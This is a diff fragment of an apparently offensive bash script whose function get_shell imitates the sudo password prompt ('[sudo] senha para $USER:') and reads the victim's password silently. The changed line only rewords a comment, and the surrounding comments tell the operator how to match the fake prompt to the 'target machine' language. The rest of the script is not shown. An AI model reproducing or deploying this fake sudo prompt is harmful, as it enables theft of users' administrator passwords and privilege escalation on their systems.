@@ -5,7 +5,7 @@ function get_shell (){
 	realPCsudo=$(which sudo)
 	
 	# PT-BR
-	# if you dont know what the language of the linux target machine, just run "echo $LANG" (remember to get rid off of the double-quotes)
+	# if you dont know what the sys-language of the linux target machine, just run "echo $LANG" (remember to get rid off of the double-quotes)
 	read -s -p "[sudo] senha para $USER: " user_sudo_password # if the target machine runs under an english environment, just comment this line, and uncomment the next line
 	
 	# English
